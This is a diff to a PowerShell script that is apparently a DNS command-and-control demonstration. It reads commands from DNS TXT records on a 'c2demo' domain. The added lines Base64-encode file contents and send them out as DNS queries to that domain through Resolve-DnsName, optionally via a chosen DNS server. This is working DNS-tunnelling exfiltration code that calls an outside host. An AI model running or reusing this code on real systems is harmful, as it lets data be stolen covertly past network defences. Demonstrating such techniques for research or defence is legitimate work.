@@ -1,5 +1,6 @@
 ﻿PARAM (
-    $dnsName = "c2demo.ronnkvist.nu"
+    [string] $dnsName = "c2demo.ronnkvist.nu",
+    [string] $demoC2DnsServer
 )
 
 Write-Host "Using DNS TXT-records from: $($dnsName)"
@@ -99,7 +100,18 @@ foreach ($c2 in $c2Commands) {
                     [string]$encodedContent = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($fileContent))
                     Write-Host "  Base64: $($encodedContent)"
 
-                    Write-Host "   Query: $($encodedContent).$($dnsName)"
+                    $dnsOkContent = $encodedContent.Replace("=", "-").Replace("+", "_")
+                    Write-Host "  DNS OK: $($dnsOkContent)"
+
+                    Write-Host "   Query: $($dnsOkContent).$($dnsName)"
+
+                    if ($demoC2DnsServer) {
+                        Write-Host "  Server: $($demoC2DnsServer)"
+                        Resolve-DnsName "$($dnsOkContent).$($dnsName)" -Server $demoC2DnsServer -ErrorAction SilentlyContinue
+                    } else {
+                        Resolve-DnsName "$($dnsOkContent).$($dnsName)" -ErrorAction SilentlyContinue
+                    }
+                    
                 }
 
         default {
